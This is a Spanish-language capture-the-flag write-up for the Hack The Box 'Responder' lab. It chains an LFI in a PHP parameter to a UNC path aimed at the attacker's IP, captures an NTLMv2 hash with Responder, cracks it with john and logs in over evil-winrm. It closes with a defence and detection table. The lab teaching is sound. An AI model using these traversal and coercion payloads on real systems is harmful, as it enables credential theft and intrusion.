---
title: Responder (HTB Starting Point)
date: 2026-06-15
tags: [ciberseguridad, htb, starting-point, pentesting, lfi, ntlm, winrm, responder, hash-cracking, windows]
type: nota
status: en-progreso
source: claude-code
aliases: [HTB Responder, Responder HTB, LFI NTLM Capture]
---

# Responder — HTB Starting Point (Tier 1)

**Tier 1 · SO: Windows · Dificultad: Very Easy · Skills: LFI, NTLM hash capture (Responder), crackeo offline (john), WinRM (evil-winrm)**

Máquina didáctica que encadena tres vulnerabilidades clásicas en entornos Windows: un LFI en una web PHP que acepta rutas UNC, la captura de hashes NTLMv2 mediante un servidor SMB falso (Responder), y acceso remoto por WinRM con las credenciales obtenidas. El patrón completo ilustra cómo un fallo de validación de entrada puede escalar hasta comprometer el sistema.

> **Aviso legal:** Hack The Box es un laboratorio de ciberseguridad legal y autorizado. Estas técnicas solo deben practicarse en entornos donde se tenga permiso explícito.

---

## Objetivo

Obtener la flag de la máquina Windows explotando un LFI que fuerza autenticación NTLM saliente, capturar el hash con Responder, crackearlo offline y conectar vía WinRM.

---

## Acceso a la maquina (paso previo)

Antes de atacar nada necesitas conectarte a la red de HTB y arrancar la maquina para obtener su **IP**:

1. **Descarga tu VPN** desde el panel de HTB (Starting Point -> *Connect* -> descarga el `.ovpn`).
2. **Conectate a la VPN** y dejala corriendo en una terminal aparte:
   ```bash
   sudo openvpn starting_point_<tu_usuario>.ovpn
   ```
3. **Lanza la maquina** en la web (boton *Spawn Machine*). HTB te dara una **IP** (tipo `10.129.x.x`).
4. Comprueba que llegas a ella:
   ```bash
   ping -c2 <IP>
   ```
5. En el resto de este writeup, **sustituye `<IP>` por la IP que te toque** (es dinamica: cambia cada vez que lanzas la maquina).

> Alternativa sin VPN: el **Pwnbox** (Kali en el navegador que ofrece HTB) ya viene conectado a la red; solo lanzas la maquina y usas su IP directamente.

## Reconocimiento

**Categoría:** escaneo de puertos y servicios.

```bash
nmap -sV -sC -p- --min-rate 5000 <IP>
```

Puertos relevantes que aparecen:

| Puerto | Servicio | Relevancia |
|--------|----------|------------|
| 80/tcp | HTTP (IIS / Apache) | Aplicación web con LFI |
| 5985/tcp | WinRM (HTTP) | Acceso remoto Windows; necesita credenciales |

El puerto 5985 (WinRM) indica que si obtenemos credenciales válidas podemos abrir una shell remota sin necesidad de exploits adicionales.

---

## Enumeracion

**Categoría:** análisis de la aplicación web / detección de LFI.

Abre `http://<IP>/` en el navegador. La web tiene un parámetro `?page=` que carga ficheros locales:

```
http://<IP>/index.php?page=about.php
```

Prueba de LFI clásico (inclusión de fichero local del sistema):

```bash
http://<IP>/index.php?page=../../../../windows/system32/drivers/etc/hosts
```

Si el contenido del fichero aparece en la respuesta, el LFI está confirmado. Este parámetro no valida ni sanitiza la entrada — acepta cualquier ruta, incluyendo rutas UNC de red (`\\servidor\recurso`).

---

## Acceso inicial (foothold)

**Categoría:** LFI → forzado de autenticación NTLM → captura de hash NTLMv2 → crackeo offline → WinRM.

### 1. Preparar Responder

Responder es un servidor SMB/HTTP/NBT-NS falso que captura hashes NTLM cuando un cliente intenta autenticarse contra él.

Identifica tu interfaz de red activa (la que tiene conexión a la VPN de HTB, normalmente `tun0`):

```bash
ip a
```

Lanza Responder escuchando en esa interfaz:

```bash
sudo responder -I tun0
```

Deja esta terminal abierta y en escucha.

### 2. Forzar la autenticación NTLM via LFI + ruta UNC

En lugar de incluir un fichero local, le pasas al servidor una ruta UNC que apunta a **tu propia IP**. Windows intentará autenticarse contra ese "servidor SMB" y Responder capturará el hash:

```
http://<IP>/index.php?page=//<TU_IP>/share
```

Sustituye `<TU_IP>` por la IP de tu interfaz `tun0` (la que aparece en `ip a`).

El servidor Windows hace una petición SMB hacia ti → Responder responde con un reto → el cliente devuelve el hash NTLMv2.

En la terminal de Responder verás algo como:

```
[SMB] NTLMv2-SSP Hash : administrator::<DOMINIO>:<challenge>:<hash_ntlmv2>
```

Copia la línea completa del hash y guárdala en un fichero:

```bash
echo '<hash_ntlmv2_completo>' > hash.txt
```

### 3. Crackear el hash offline con john

**Categoría:** ataque de diccionario sobre hash NTLMv2.

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Si la contraseña está en rockyou, john la mostrará en texto claro. Anótala — es la contraseña del usuario `administrator` (o el usuario que apareció en el hash).

### 4. Conectar por WinRM con evil-winrm

**Categoría:** acceso remoto autenticado (WinRM / Puerto 5985).

```bash
evil-winrm -i <IP> -u administrator -p <contrasena_crackeada>
```

Si la autenticación es correcta, obtienes una shell PowerShell remota en la máquina.

---

## Escalada de privilegios

No requiere privesc: el hash capturado pertenece al usuario `administrator`. La conexión con evil-winrm ya entra con privilegios de administrador y la flag se obtiene directamente.

---

## Flags

Esta máquina tiene **una sola flag** (no hay separación user/root en muchas máquinas de Starting Point).

Desde la shell de evil-winrm, busca el fichero:

```powershell
Get-ChildItem -Path C:\ -Recurse -Filter "flag.txt" -ErrorAction SilentlyContinue
type C:\Users\Administrator\Desktop\flag.txt
```

La flag tiene el formato `HTB{...}`. Guárdala como `<flag>`.

> La ubicación exacta puede variar; si no está en el Desktop del Administrador, prueba también `C:\Users\mike\Desktop\` u otros usuarios que aparezcan en `C:\Users\`.

---

## Patron y teoria

**Este es el patrón más importante de esta máquina.**

### El patrón: LFI → Coercion NTLM → Crackeo → Lateral Movement

```
LFI sin sanitizar
    └─► acepta rutas UNC (\\IP\share)
            └─► Windows intenta autenticación SMB saliente
                    └─► Responder captura NTLMv2
                            └─► john crackea offline (diccionario)
                                    └─► evil-winrm → shell con privilegios
```

Cada eslabón es un fallo independiente; encadenados, comprometen el sistema completo.

### Por que funciona esto (teoría)

**LFI (Local File Inclusion):** ocurre cuando el servidor pasa directamente la entrada del usuario a una función de inclusión de ficheros (`include()`, `require()` en PHP, equivalentes en otros lenguajes) sin validar ni filtrar. Las rutas UNC (`//IP/share` o `\\IP\share`) son sintaxis válida en Windows para referencias a recursos de red.

**NTLM Coercion:** cuando Windows resuelve una ruta UNC hacia un servidor desconocido, inicia automáticamente una negociación de autenticación SMB con el protocolo NTLM. No pregunta al usuario — es comportamiento por defecto del sistema operativo. El hash NTLMv2 que se intercambia es un hash de desafío-respuesta: **no es la contraseña**, pero es crackeable offline si la contraseña es débil.

**Hash NTLMv2 y crackeo:** john/hashcat prueban contraseñas del diccionario, calculan el hash NTLMv2 correspondiente y comparan. Si coincide, recuperan la contraseña. El coste computacional está del lado del atacante, no del sistema atacado — por eso las contraseñas débiles son tan peligrosas.

**WinRM:** puerto 5985 es el servicio de gestión remota de Windows. Con credenciales válidas, evil-winrm abre una shell completa. Está habilitado por defecto en muchos entornos corporativos para administración remota legítima.

### Como se defiende (clave dev / purple team)

| Vector | Defensa |
|--------|---------|
| **LFI** | Nunca construyas rutas de ficheros con entrada del usuario. Usa una whitelist de páginas permitidas (`['about', 'contact']`) y resuelve la ruta internamente. |
| **Rutas UNC salientes** | En el firewall perimetral y en el host: bloquea el tráfico SMB saliente (puerto 445/TCP y 139/TCP) desde los servidores web hacia Internet o redes no confiables. |
| **NTLM saliente** | GPO: `Network security: Restrict NTLM: Outgoing NTLM traffic to remote servers → Deny All` para servidores que no necesiten autenticación NTLM saliente. |
| **Contraseñas débiles** | Política de contraseñas: mínimo 14 caracteres, complejidad, rotación; idealmente cuentas de servicio con contraseñas aleatorias largas (no crackeables con rockyou). |
| **WinRM expuesto** | Restringir WinRM a IPs de administración conocidas mediante firewall. Considerar autenticación por certificado en lugar de usuario/contraseña. |
| **Detección** | En SIEM: alertar sobre conexiones SMB salientes desde servidores web, fallos de autenticación NTLM repetidos, y conexiones nuevas a WinRM desde IPs no habituales. |

> **Insight de diseño:** el LFI es la puerta, pero el daño real lo amplifica que Windows haga autenticación automática y que la contraseña sea crackeable. Arreglar cualquiera de los tres eslabones rompe la cadena.

---

## Conexiones

- [[HTB_Starting_Point/00_README]]
- [[MOC_Ciberseguridad]]
- [[12-aprender-y-carrera]]
- [[13-herramientas-en-detalle]]
